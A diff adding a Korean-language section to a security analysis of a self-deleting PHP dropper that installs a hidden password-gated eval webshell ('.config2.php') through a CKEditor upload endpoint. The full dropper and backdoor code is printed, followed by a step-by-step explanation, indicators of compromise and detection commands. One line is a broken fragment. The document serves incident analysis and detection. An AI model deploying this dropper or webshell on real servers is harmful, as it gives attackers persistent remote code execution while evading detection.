@@ -128,3 +128,133 @@ POST로 전달된 매개변수(`cc`) 안의 **PHP 코드(또는 HEX 인코딩된
 이 구조 때문에 공격자는 **`cc`** 파라미터에 HEX 인코딩된 PHP 코드를 전송해 서버에서 아무 명령이나 실행할 수 있습니다.
 예: 파일 업로드, 리버스쉘, DB 덤프 등.
 
+
+---
+## 🔍 예제 3.  자기삭제형 지속성 웹셸 생성 공격
+
+
+```php
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+
+$file = '.config2.php';
+$code = '<?php if(md5($_GET["pass"]) == "<some_md5_value>") { eval($_POST["cmd"]); } ?>';
+file_put_contents($file, $code);
+?>
+```
+
+.php` 는
+실제로 **공격 대상**의 업로드 엔드포인트입니다 — 즉, 이 악성 PHP 코드를 업로드해서 실행하려는 시도입니다.)
+
+---
+
+## ⚙️ 2. 이 코드가 하는 일 (단계별 설명)
+
+1. **`ignore_user_abort(true)`**
+
+   * 사용자가 연결을 끊어도(예: HTTP 요청 중단) 스크립트 실행을 계속함.
+     → 공격자가 세션을 끊어도 백엔드에서 끝까지 실행되어 파일 생성 가능.
+
+2. **`set_time_limit(0)`**
+
+   * 실행 시간 제한 해제 → 무한 실행 가능.
+     → PHP의 max_execution_time 제한 회피.
+
+3. **`unlink(__FILE__)`**
+
+   * 현재 실행 중인 악성 파일(예: 업로드된 공격 스크립트)을 **즉시 삭제.**
+   * 흔적 제거 목적 (로그는 남지만 파일이 사라져 탐지 어렵게 함).
+
+4. **`$file = '.config2.php';`**
+
+   * 새 웹셸 파일명을 `.config2.php` 로 지정 (보통 숨김용 이름 — 점(.)으로 시작).
+
+5. **`$code = '<?php if(md5($_GET["pass"]) == "...") { eval($_POST["cmd"]); } ?>';`**
+
+   * 새로운 백도어 웹셸 코드 정의.
+
+   * 이 파일(`.config2.php`)은 다음과 같이 작동함:
+
+     ```php
+     <?php
+     if (md5($_GET['pass']) == 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx') {
+         eval($_POST['cmd']);
+     }
+     ?>
+     ```
+
+   * 즉, 공격자는 `/Common/ckeditor/plugins/multiimg/dialogs/.config2.php?pass=<비밀번호>` 로 접근해
+     `cmd` POST 파라미터에 임의 PHP 코드를 보내면,
+     서버에서 그대로 **`eval()` → 원격 코드 실행(RCE)** 이 가능합니다.
+
+6. **`file_put_contents($file, $code);`**
+
+   * 위 `$code` 내용을 `.config2.php` 파일로 저장함 → **웹셸 영구 설치.**
+
+7. **`unlink(__FILE__)`**
+
+   * 실행이 끝나면 **자신(업로드된 초기 스크립트)** 는 삭제 → 탐지 회피.
+
+---
+
+## 🧠 3. 결과적으로 하는 일
+
+| 단계  | 설명                                                  |
+| --- | --------------------------------------------------- |
+| 1️⃣ | 공격자는 업로드 취약점을 통해 이 PHP 코드를 업로드                      |
+| 2️⃣ | 서버에서 이 코드가 실행됨                                      |
+| 3️⃣ | `.config2.php` 웹셸이 조용히 생성됨                          |
+| 4️⃣ | 원래 업로드된 악성 파일은 `unlink()`로 삭제 (흔적 제거)               |
+| 5️⃣ | 공격자는 이후 `.config2.php?pass=<암호>` 로 접속하여 원격 명령 실행 가능 |
+
+---
+
+## ⚠️ 4. 공격 의도
+
+이건 “**스텔스 웹셸 설치 + 자기삭제**” 공격이에요.
+공격자는 단 한 번만 업로드 성공해도,
+
+* 새로운 웹셸을 만들어두고
+* 자신이 쓴 초기 페이로드 파일은 삭제해
+  보안 솔루션 탐지를 어렵게 만듭니다.
+
+즉, **CVE-2021-33841** 같은 CKEditor 이미지 업로드 취약점을 노린 **웹셸 주입 공격** 패턴입니다.
+
+---
+
+## 🔥 5. 확실한 공격 증거
+
+* `/Common/ckeditor/plugins/multiimg/dialogs/` 디렉터리에 `.config2.php` 또는 유사 이름 PHP 파일이 생성됨.
+* `.config2.php` 내부에 `if(md5($_GET['pass'])==...) eval($_POST['cmd']);` 같은 코드 존재.
+* 원래 업로드된 악성 파일은 삭제되어 없음(`unlink(__FILE__)` 미작동 시).
+* 서버 로그에서 같은 시간대에
+
+  ```
+  POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php
+  ```
+
+  요청이 있음.
+
+---
+
+## 🔒 6. 지금 바로 확인해야 할 것들
+
+### ✅ 파일 확인
+
+```bash
+find /var/www/html -type f -name ".config2.php" -mtime -7
+grep -R "md5($_GET" /var/www/html/Common/ckeditor/plugins/multiimg/dialogs/
+```
+
+### ✅ 접근 로그
+
+```bash
+grep -i "image_upload.php" /var/log/nginx/access.log*
+grep -i ".config2.php" /var/log/nginx/access.log*
+```
+
+###
+
+
